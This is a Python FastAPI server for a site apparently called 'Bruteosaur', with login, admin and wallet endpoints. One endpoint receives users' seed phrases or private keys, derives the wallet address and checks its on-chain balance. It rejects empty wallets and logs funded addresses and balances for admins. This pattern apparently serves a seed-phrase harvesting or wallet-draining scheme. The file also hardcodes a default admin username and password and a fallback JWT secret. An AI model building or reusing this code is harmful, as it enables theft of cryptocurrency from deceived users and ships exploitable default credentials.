from fastapi import FastAPI, APIRouter, HTTPException, Depends, Request, Response
from fastapi.responses import JSONResponse
from dotenv import load_dotenv
from starlette.middleware.cors import CORSMiddleware
from motor.motor_asyncio import AsyncIOMotorClient
import os
import logging
from pathlib import Path
from pydantic import BaseModel, Field, constr
from typing import List, Optional, Literal, Any, Dict
import uuid
from datetime import datetime, timedelta
import jwt
from passlib.context import CryptContext

# web3 / bip utils for real validation
from web3 import Web3
from web3.middleware import geth_poa_middleware
from eth_account import Account
from bip_utils import Bip39SeedGenerator, Bip39MnemonicValidator, Bip44, Bip44Coins, Bip44Changes

ROOT_DIR = Path(__file__).parent
load_dotenv(ROOT_DIR / '.env')

# MongoDB connection
mongo_url = os.environ['MONGO_URL']
client = AsyncIOMotorClient(mongo_url)
db = client[os.environ['DB_NAME']]

# App
app = FastAPI()
api = APIRouter(prefix="/api")

# Security
JWT_SECRET = os.environ.get("JWT_SECRET", "dev-secret-change-me")
JWT_ALG = "HS256"
COOKIE_NAME = "session"
PWD_CTX = CryptContext(schemes=["pbkdf2_sha256"], deprecated="auto")
SECURE_COOKIES = os.environ.get("COOKIE_SECURE", "true").lower() in {"1", "true", "yes"}

# Env config for chains/walletconnect
CHAINS = [c.strip() for c in os.environ.get("CHAINS", "ethereum,polygon,bsc").split(",") if c.strip()]
WC_PROJECT_ID = os.environ.get("WC_PROJECT_ID")
# Allow env or well-known public defaults for RPC
DEFAULT_RPCS = {
    "ethereum": "https://cloudflare-eth.com",
    "polygon": "https://polygon-rpc.com",
    "bsc": "https://bsc-dataseed.binance.org",
}
RPC_URLS = {
    "ethereum": os.environ.get("RPC_ETH_URL") or DEFAULT_RPCS["ethereum"],
    "polygon": os.environ.get("RPC_POLYGON_URL") or DEFAULT_RPCS["polygon"],
    "bsc": os.environ.get("RPC_BSC_URL") or DEFAULT_RPCS["bsc"],
}

# Logging
logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(name)s - %(levelname)s - %(message)s')
logger = logging.getLogger("bruteosaur")

# Models
UsernameStr = constr(min_length=3, max_length=32, pattern=r"^[a-zA-Z0-9_.-]+$")
PasswordStr = constr(min_length=8, max_length=128)

class UserPublic(BaseModel):
    id: str
    username: str
    role: Literal["user", "admin"]
    created_at: datetime

class UserCreate(BaseModel):
    username: UsernameStr
    password: PasswordStr

class UserLogin(BaseModel):
    username: UsernameStr
    password: str

# Email-based auth models
try:
    from pydantic import EmailStr as _EmailStr
    EmailStr = _EmailStr  # type: ignore
except Exception:
    # fallback simple constraint if EmailStr unavailable
    EmailStr = constr(min_length=5, max_length=256)  # type: ignore

class UserEmailCreate(BaseModel):
    email: EmailStr
    password: PasswordStr

class UserEmailLogin(BaseModel):
    email: EmailStr
    password: str

class LogCreate(BaseModel):
    type: constr(min_length=1, max_length=64)
    action: constr(min_length=1, max_length=128)
    metadata: Optional[Dict[str, Any]] = None

class WalletManualValidateReq(BaseModel):
    method: Literal["mnemonic", "private_key"]
    secret: constr(min_length=12, max_length=4096)
    chain: Optional[Literal["ethereum", "polygon", "bsc"]] = None

class WalletAddressCheckReq(BaseModel):
    address: constr(min_length=4, max_length=128)
    chain: Optional[Literal["ethereum", "polygon", "bsc"]] = None

# Utilities
async def get_user_by_username(username: str) -> Optional[dict]:
    return await db.users.find_one({"username": username})

async def get_user_by_email(email: str) -> Optional[dict]:
    return await db.users.find_one({"email": email})

async def get_user_by_id(uid: str) -> Optional[dict]:
    return await db.users.find_one({"id": uid})

async def ensure_indexes():
    await db.users.create_index("username", unique=True)
    await db.users.create_index("email", unique=True)
    await db.logs.create_index([("created_at", 1)])
    await db.wallet_validations.create_index([("created_at", 1)])

async def seed_admin_if_needed():
    # Admin seed from env or provided defaults
    seed_username = os.environ.get("ADMIN_SEED_USERNAME", "Maanjash9690")
    seed_password = os.environ.get("ADMIN_SEED_PASSWORD", "Iforgotpass8869@")
    existing = await get_user_by_username(seed_username)
    if not existing:
        now = datetime.utcnow()
        admin_user = {
            "id": str(uuid.uuid4()),
            "username": seed_username,
            "password_hash": PWD_CTX.hash(seed_password),
            "role": "admin",
            "created_at": now,
        }
        await db.users.insert_one(admin_user)
        logger.info("Seeded admin user '%s'", seed_username)


def hash_password(password: str) -> str:
    return PWD_CTX.hash(password)


def verify_password(password: str, hashed: str) -> bool:
    return PWD_CTX.verify(password, hashed)


def make_jwt(uid: str, role: str) -> str:
    now = datetime.utcnow()
    payload = {
        "sub": uid,
        "role": role,
        "iat": int(now.timestamp()),
        "exp": int((now + timedelta(days=7)).timestamp()),
        "jti": str(uuid.uuid4()),
    }
    return jwt.encode(payload, JWT_SECRET, algorithm=JWT_ALG)


def parse_jwt(token: str) -> dict:
    try:
        return jwt.decode(token, JWT_SECRET, algorithms=[JWT_ALG])
    except jwt.ExpiredSignatureError:
        raise HTTPException(status_code=401, detail="SESSION_EXPIRED")
    except Exception:
        raise HTTPException(status_code=401, detail="INVALID_SESSION")


async def get_current_user(request: Request) -> dict:
    token = request.cookies.get(COOKIE_NAME)
    if not token:
        raise HTTPException(status_code=401, detail="NO_SESSION")
    payload = parse_jwt(token)
    uid = payload.get("sub")
    user = await get_user_by_id(uid)
    if not user:
        raise HTTPException(status_code=401, detail="INVALID_USER")
    return user


def set_session_cookie(resp: Response, token: str):
    resp.set_cookie(
        key=COOKIE_NAME,
        value=token,
        httponly=True,
        secure=SECURE_COOKIES,
        samesite="lax",
        max_age=7*24*3600,
        path="/",
    )


# Web3 helpers
def get_w3(chain: str) -> Web3:
    url = RPC_URLS.get(chain)
    if not url:
        raise HTTPException(status_code=501, detail="RPC_NOT_CONFIGURED")
    w3 = Web3(Web3.HTTPProvider(url, request_kwargs={"timeout": 15}))
    # Inject POA for polygon & bsc
    if chain in ("polygon", "bsc"):
        try:
            w3.middleware_onion.inject(geth_poa_middleware, layer=0)
        except Exception:
            pass
    if not w3.is_connected():
        raise HTTPException(status_code=502, detail=f"RPC_CONNECT_FAILED_{chain.upper()}")
    return w3


def derive_pk_from_mnemonic(mnemonic: str) -> str:
    # Validate mnemonic words (12/24)
    try:
        Bip39MnemonicValidator(mnemonic).Validate()
    except Exception:
        raise HTTPException(status_code=400, detail="INVALID_MNEMONIC_FORMAT")
    seed_bytes = Bip39SeedGenerator(mnemonic).Generate()
    bip44_ctx = Bip44.FromSeed(seed_bytes, Bip44Coins.ETHEREUM)
    acct = bip44_ctx.Purpose().Coin().Account(0).Change(Bip44Changes.CHAIN_EXT).AddressIndex(0)
    pk_hex = acct.PrivateKey().Raw().ToHex()
    return pk_hex


def address_from_private_key(pk_hex: str) -> str:
    if pk_hex.lower().startswith("0x"):
        pk_hex = pk_hex[2:]
    if not (len(pk_hex) == 64 and all(c in '0123456789abcdefABCDEF' for c in pk_hex)):
        raise HTTPException(status_code=400, detail="INVALID_PRIVATE_KEY_FORMAT")
    acct = Account.from_key(bytes.fromhex(pk_hex))
    return acct.address


# Basic root & health
@api.get("/")
async def root():
    return {"message": "Bruteosaur API online"}


# Auth endpoints
@api.post("/auth/register", response_model=UserPublic, status_code=201)
async def register(req: UserCreate):
    await ensure_indexes()
    existing = await get_user_by_username(req.username)
    if existing:
        raise HTTPException(status_code=409, detail="USERNAME_TAKEN")
    now = datetime.utcnow()
    user = {
        "id": str(uuid.uuid4()),
        "username": req.username,
        "password_hash": hash_password(req.password),
        "role": "user",
        "created_at": now,
    }
    # If this is the first user, promote to admin (kept for miners site users)
    users_count = await db.users.estimated_document_count()
    if users_count == 0:
        user["role"] = "admin"
    await db.users.insert_one(user)
    return UserPublic(**{k: user[k] for k in ["id", "username", "role", "created_at"]})


@api.post("/auth/login", response_model=UserPublic)
async def login(req: UserLogin):
    user = await get_user_by_username(req.username)
    if not user or not verify_password(req.password, user.get("password_hash", "")):
        raise HTTPException(status_code=401, detail="INVALID_CREDENTIALS")
    token = make_jwt(user["id"], user["role"])
    user_data = UserPublic(**{k: user[k] for k in ["id", "username", "role", "created_at"]})
    resp = JSONResponse(user_data.model_dump(mode='json'))
    set_session_cookie(resp, token)
    await db.logs.insert_one({
        "id": str(uuid.uuid4()),
        "user_id": user["id"],
        "type": "auth",
        "action": "login",
        "metadata": {"method": "username"},
        "ip": None,
        "ua": None,
        "created_at": datetime.utcnow(),
    })
    return resp

@api.post("/auth/register-email", response_model=UserPublic, status_code=201)
async def register_email(req: UserEmailCreate):
    await ensure_indexes()
    existing = await get_user_by_email(str(req.email))
    if existing:
        raise HTTPException(status_code=409, detail="EMAIL_TAKEN")
    now = datetime.utcnow()
    # generate a safe username from email local part
    local_part = str(req.email).split("@")[0]
    safe_username = "".join(ch if ch.isalnum() or ch in "._-" else "_" for ch in local_part)[:32]
    # ensure unique username
    if await get_user_by_username(safe_username):
        safe_username = f"{safe_username}_{uuid.uuid4().hex[:6]}"
    user = {
        "id": str(uuid.uuid4()),
        "username": safe_username,
        "email": str(req.email),
        "password_hash": hash_password(req.password),
        "role": "user",
        "created_at": now,
    }
    users_count = await db.users.estimated_document_count()
    if users_count == 0:
        user["role"] = "admin"
    await db.users.insert_one(user)
    return UserPublic(**{k: user[k] for k in ["id", "username", "role", "created_at"]})

@api.post("/auth/login-email", response_model=UserPublic)
async def login_email(req: UserEmailLogin):
    user = await get_user_by_email(str(req.email))
    if not user or not verify_password(req.password, user.get("password_hash", "")):
        raise HTTPException(status_code=401, detail="INVALID_CREDENTIALS")
    token = make_jwt(user["id"], user["role"])
    user_data = UserPublic(**{k: user[k] for k in ["id", "username", "role", "created_at"]})
    resp = JSONResponse(user_data.model_dump(mode='json'))
    set_session_cookie(resp, token)
    await db.logs.insert_one({
        "id": str(uuid.uuid4()),
        "user_id": user["id"],
        "type": "auth",
        "action": "login",
        "metadata": {"method": "email"},
        "ip": None,
        "ua": None,
        "created_at": datetime.utcnow(),
    })
    return resp


@api.post("/auth/logout", status_code=204)
async def logout():
    resp = Response(status_code=204)
    resp.delete_cookie(COOKIE_NAME, path="/")
    return resp


@api.get("/auth/me", response_model=UserPublic)
async def me(user: dict = Depends(get_current_user)):
    return UserPublic(**{k: user[k] for k in ["id", "username", "role", "created_at"]})


# Logs
@api.post("/logs", status_code=201)
async def create_log(req: LogCreate, request: Request):
    # try to attach user if session exists
    uid = None
    try:
        token = request.cookies.get(COOKIE_NAME)
        if token:
            payload = parse_jwt(token)
            uid = payload.get("sub")
    except Exception:
        uid = None
    doc = {
        "id": str(uuid.uuid4()),
        "user_id": uid,
        "type": req.type,
        "action": req.action,
        "metadata": req.metadata or {},
        "ip": request.client.host if request.client else None,
        "ua": request.headers.get("user-agent"),
        "created_at": datetime.utcnow(),
    }
    await db.logs.insert_one(doc)
    return {"id": doc["id"]}


# Wallet
@api.get("/wallet/wc/config")
async def walletconnect_config():
    if not WC_PROJECT_ID:
        raise HTTPException(status_code=501, detail="WALLETCONNECT_PROJECT_ID_MISSING")
    return {"projectId": WC_PROJECT_ID, "chains": CHAINS}


@api.post("/wallet/manual-validate")
async def manual_validate(req: WalletManualValidateReq, user: dict = Depends(get_current_user)):
    chain = (req.chain or CHAINS[0]).lower()
    if chain not in RPC_URLS:
        raise HTTPException(status_code=400, detail="UNSUPPORTED_CHAIN")

    # Derive address from secret
    if req.method == "mnemonic":
        # quick word count guard
        words = req.secret.strip().split()
        if len(words) not in (12, 24):
            raise HTTPException(status_code=400, detail="INVALID_MNEMONIC_FORMAT")
        pk_hex = derive_pk_from_mnemonic(req.secret.strip())
        address = address_from_private_key(pk_hex)
    else:
        address = address_from_private_key(req.secret.strip())

    # Check on-chain balance
    w3 = get_w3(chain)
    try:
        bal_wei = w3.eth.get_balance(address)
    except Exception as e:
        logger.exception("balance_fetch_failed")
        raise HTTPException(status_code=502, detail="BALANCE_FETCH_FAILED")

    if bal_wei <= 0:
        # store rejected validation
        doc = {
            "id": str(uuid.uuid4()),
            "user_id": user["id"],
            "method": req.method,
            "chain": chain,
            "address": address,
            "balance": str(bal_wei),
            "status": "rejected",
            "error": "ZERO_BALANCE",
            "created_at": datetime.utcnow(),
        }
        await db.wallet_validations.insert_one(doc)
        raise HTTPException(status_code=422, detail="ZERO_BALANCE")

    # success
    doc = {
        "id": str(uuid.uuid4()),
        "user_id": user["id"],
        "method": req.method,
        "chain": chain,
        "address": address,
        "balance": str(bal_wei),
        "status": "validated",
        "created_at": datetime.utcnow(),
    }
    await db.wallet_validations.insert_one(doc)
    # Also log action
    await db.logs.insert_one({
        "id": str(uuid.uuid4()),
        "user_id": user["id"],
        "type": "wallet",
        "action": "manual_validate",
        "metadata": {"chain": chain, "method": req.method, "address": address, "balance": str(bal_wei)},
        "ip": None,
        "ua": None,
        "created_at": datetime.utcnow(),
    })

    return {"status": "validated", "address": address, "balance": str(Web3.from_wei(bal_wei, 'ether'))}

@api.post("/wallet/check-balance")
async def check_balance(req: WalletAddressCheckReq, user: dict = Depends(get_current_user)):
    chain = (req.chain or CHAINS[0]).lower()
    if chain not in RPC_URLS:
        raise HTTPException(status_code=400, detail="UNSUPPORTED_CHAIN")
    address_input = req.address.strip()
    if not Web3.is_address(address_input):
        raise HTTPException(status_code=400, detail="INVALID_ADDRESS")
    address = Web3.to_checksum_address(address_input)
    w3 = get_w3(chain)
    try:
        bal_wei = w3.eth.get_balance(address)
    except Exception:
        logger.exception("balance_fetch_failed")
        raise HTTPException(status_code=502, detail="BALANCE_FETCH_FAILED")

    if bal_wei <= 0:
        doc = {
            "id": str(uuid.uuid4()),
            "user_id": user["id"],
            "method": "address",
            "chain": chain,
            "address": address,
            "balance": str(bal_wei),
            "status": "rejected",
            "error": "ZERO_BALANCE",
            "created_at": datetime.utcnow(),
        }
        await db.wallet_validations.insert_one(doc)
        raise HTTPException(status_code=422, detail="ZERO_BALANCE")

    doc = {
        "id": str(uuid.uuid4()),
        "user_id": user["id"],
        "method": "address",
        "chain": chain,
        "address": address,
        "balance": str(bal_wei),
        "status": "validated",
        "created_at": datetime.utcnow(),
    }
    await db.wallet_validations.insert_one(doc)
    await db.logs.insert_one({
        "id": str(uuid.uuid4()),
        "user_id": user["id"],
        "type": "wallet",
        "action": "check_balance",
        "metadata": {"chain": chain, "address": address, "balance": str(bal_wei)},
        "ip": None,
        "ua": None,
        "created_at": datetime.utcnow(),
    })
    return {"status": "validated", "address": address, "balance": str(Web3.from_wei(bal_wei, 'ether'))}


# Admin
async def require_admin(user: dict = Depends(get_current_user)) -> dict:
    if user.get("role") != "admin":
        raise HTTPException(status_code=403, detail="FORBIDDEN")
    return user


@api.get("/admin/users")
async def admin_users(_admin: dict = Depends(require_admin)):
    cur = db.users.find({}, {"password_hash": 0})
    items = await cur.to_list(1000)
    for it in items:
        it.pop("_id", None)
    total = await db.users.estimated_document_count()
    return {"items": items, "total": total}


class RolePatch(BaseModel):
    role: Literal["user", "admin"]


@api.patch("/admin/users/{user_id}/role")
async def admin_patch_role(user_id: str, body: RolePatch, _admin: dict = Depends(require_admin)):
    user = await get_user_by_id(user_id)
    if not user:
        raise HTTPException(status_code=404, detail="USER_NOT_FOUND")
    await db.users.update_one({"id": user_id}, {"$set": {"role": body.role}})
    user["role"] = body.role
    return {k: user[k] for k in ["id", "username", "role", "created_at"]}


@api.get("/admin/logs")
async def admin_logs(limit: int = 50, cursor: Optional[str] = None, type: Optional[str] = None, action: Optional[str] = None, user_id: Optional[str] = None, _admin: dict = Depends(require_admin)):
    q: Dict[str, Any] = {}
    if type:
        q["type"] = type
    if action:
        q["action"] = action
    if user_id:
        q["user_id"] = user_id
    if cursor:
        try:
            dt = datetime.fromisoformat(cursor)
            q["created_at"] = {"$lt": dt}
        except Exception:
            pass
    cur = db.logs.find(q).sort("created_at", -1).limit(min(200, max(1, limit)))
    items = await cur.to_list(length=limit)
    for it in items:
        it.pop("_id", None)
    next_cursor = items[-1]["created_at"].isoformat() if items else None
    return {"items": items, "next_cursor": next_cursor}


@api.get("/admin/stats")
async def admin_stats(_admin: dict = Depends(require_admin)):
    totals = {
        "users": await db.users.estimated_document_count(),
        "logs": await db.logs.estimated_document_count(),
        "wallet_validations": await db.wallet_validations.estimated_document_count(),
    }
    # Aggregate users by day
    pipeline = [
        {"$group": {"_id": {"$dateToString": {"format": "%Y-%m-%d", "date": "$created_at"}}, "count": {"$sum": 1}}},
        {"$sort": {"_id": 1}},
    ]
    users_by_day = [{"day": d["_id"], "count": d["count"]} async for d in db.users.aggregate(pipeline)]

    # validations by status
    pipeline2 = [
        {"$group": {"_id": "$status", "count": {"$sum": 1}}},
        {"$sort": {"count": -1}},
    ]
    validations_by_status = [{"status": d.get("_id") or "unknown", "count": d["count"]} async for d in db.wallet_validations.aggregate(pipeline2)]

    return {"totals": totals, "users_by_day": users_by_day, "validations_by_status": validations_by_status}


# Status sample routes kept
class StatusCheck(BaseModel):
    id: str = Field(default_factory=lambda: str(uuid.uuid4()))
    client_name: str
    timestamp: datetime = Field(default_factory=datetime.utcnow)

class StatusCheckCreate(BaseModel):
    client_name: str

@api.post("/status", response_model=StatusCheck)
async def create_status_check(input: StatusCheckCreate):
    status_dict = input.model_dump()
    status_obj = StatusCheck(**status_dict)
    _ = await db.status_checks.insert_one(status_obj.model_dump())
    return status_obj

@api.get("/status", response_model=List[StatusCheck])
async def get_status_checks():
    status_checks = await db.status_checks.find().to_list(1000)
    return [StatusCheck(**{k: v for k, v in sc.items() if k != "_id"}) for sc in status_checks]

# Startup hooks
@app.on_event("startup")
async def on_startup():
    await ensure_indexes()
    await seed_admin_if_needed()

# Mount router and CORS
app.include_router(api)
# Handle Starlette CORS constraint: cannot use allow_credentials with wildcard origins
_cors_origins_env = os.environ.get('CORS_ORIGINS', '*')
_cors_origins = [o.strip() for o in _cors_origins_env.split(',') if o.strip()]
_allow_credentials = True
if _cors_origins == ['*']:
    _allow_credentials = False

app.add_middleware(
    CORSMiddleware,
    allow_credentials=_allow_credentials,
    allow_origins=_cors_origins,
    allow_methods=["*"],
    allow_headers=["*"],
)

@app.on_event("shutdown")
async def shutdown_db_client():
    client.close()